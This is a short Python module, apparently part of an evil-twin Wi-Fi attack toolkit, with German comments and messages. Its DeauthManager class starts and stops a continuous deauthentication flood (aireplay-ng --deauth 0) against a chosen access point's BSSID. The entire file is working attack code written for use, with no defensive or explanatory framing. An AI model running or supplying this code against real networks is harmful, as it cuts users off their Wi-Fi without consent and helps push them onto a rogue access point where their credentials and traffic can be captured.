# attack/evil_twin/deauth.py

import subprocess
import time

class DeauthManager:
    def __init__(self, target_bssid, iface):
        self.target_bssid = target_bssid
        self.iface = iface
        self.proc = None

    def run(self):
        print("[*] Starte Deauth Angriff mit aireplay-ng ...")
        # Dauerhaft deauth Pakete senden
        cmd = ["aireplay-ng", "--deauth", "0", "-a", self.target_bssid, self.iface]
        self.proc = subprocess.Popen(cmd)
        self.proc.wait()

    def stop(self):
        if self.proc:
            print("[*] Stoppe Deauth Angriff ...")
            self.proc.terminate()
            self.proc.wait()
            self.proc = None
